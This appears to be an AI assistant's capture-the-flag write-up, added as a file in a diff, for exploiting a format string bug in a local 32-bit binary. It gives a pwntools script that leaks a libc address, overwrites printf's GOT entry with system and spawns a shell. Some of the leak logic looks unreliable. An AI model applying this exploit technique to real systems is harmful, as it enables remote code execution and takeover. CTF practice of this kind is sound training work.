@@ -1,0 +1,109 @@
+To solve this challenge using `pwntools`, you can exploit the format string vulnerability in the `printf(buf)` call. The vulnerability arises because the `printf` function is called with user-controlled input (`buf`) without a format specifier. This allows you to leak memory addresses and potentially overwrite values in memory.
+
+Here are the steps to solve the challenge:
+
+---
+
+### Steps to Exploit the Challenge
+
+1. **Analyze the Binary**:
+   - The binary is a 32-bit ELF file.
+   - The `printf(buf)` call is vulnerable to a format string attack.
+   - The `read` function reads up to 100 bytes into the `buf` buffer.
+
+2. **Leak Memory Addresses**:
+   - Use the format string vulnerability to leak addresses from the stack or the GOT (Global Offset Table).
+   - Specifically, leak the address of a libc function (e.g., `printf`) from the GOT to calculate the base address of libc.
+
+3. **Calculate Offsets**:
+   - Use the leaked libc address to calculate the base address of libc.
+   - Use the libc base address to calculate the address of `system` and `/bin/sh`.
+
+4. **Overwrite GOT Entry**:
+   - Use the format string vulnerability to overwrite a GOT entry (e.g., `printf`) with the address of `system`.
+
+5. **Trigger the Exploit**:
+   - Send `/bin/sh` as input to the program, which will call `system("/bin/sh")` and give you a shell.
+
+---
+
+### Exploit Code Using `pwntools`
+
+Here is the Python exploit script using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary and libc
+elf = ELF('./fmt')  # Load the binary
+libc = ELF('./libc.so.6')  # Load the provided libc
+
+# Start the process
+p = process('./fmt')
+
+# Step 1: Leak libc address
+p.recvuntil("Do you know repeater?\n")  # Wait for the prompt
+
+# Use format string to leak an address from the GOT
+payload = b"%7$s" + p32(elf.got['printf'])  # Leak printf@GOT
+p.sendline(payload)
+
+# Receive and parse the leaked address
+leaked_printf = u32(p.recv(4))  # Read 4 bytes (32-bit address)
+log.info(f"Leaked printf address: {hex(leaked_printf)}")
+
+# Step 2: Calculate libc base and system address
+libc_base = leaked_printf - libc.symbols['printf']  # Calculate libc base
+log.info(f"Libc base address: {hex(libc_base)}")
+
+system_addr = libc_base + libc.symbols['system']  # Calculate system address
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))  # Find "/bin/sh" string
+log.info(f"system address: {hex(system_addr)}")
+log.info(f"/bin/sh address: {hex(bin_sh_addr)}")
+
+# Step 3: Overwrite GOT entry
+# Use format string to overwrite printf@GOT with system address
+# Split system address into two parts for writing
+lower_half = system_addr & 0xffff
+upper_half = (system_addr >> 16) & 0xffff
+
+# Construct payload to overwrite printf@GOT
+payload = fmtstr_payload(7, {elf.got['printf']: system_addr})
+p.sendline(payload)
+
+# Step 4: Trigger the exploit
+p.sendline("/bin/sh")  # Send "/bin/sh" to call system("/bin/sh")
+
+# Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Leaking libc Address**:
+   - The payload `%7$s` reads a string from the address provided after it in the payload (`p32(elf.got['printf'])`).
+   - This leaks the address of `printf` from the GOT.
+
+2. **Calculating libc Base**:
+   - Using the leaked `printf` address and the offset of `printf` in libc, calculate the base address of libc.
+
+3. **Overwriting GOT Entry**:
+   - Use the `fmtstr_payload` function from `pwntools` to construct a payload that overwrites the GOT entry for `printf` with the address of `system`.
+
+4. **Triggering the Exploit**:
+   - Send `/bin/sh` as input to the program. Since the GOT entry for `printf` now points to `system`, this effectively calls `system("/bin/sh")`.
+
+5. **Getting a Shell**:
+   - Use `p.interactive()` to interact with the shell.
+
+---
+
+### Notes
+
+- The offset `%7$s` in the format string payload may vary depending on the stack layout. You can adjust it by experimenting with different offsets.
+- Ensure that the provided `libc.so.6` file matches the one used by the binary.
+- Use `gdb` or `pwndbg` to debug the binary and verify the offsets and addresses.
+
+This script should work for the given challenge, provided the offsets and addresses are correct.
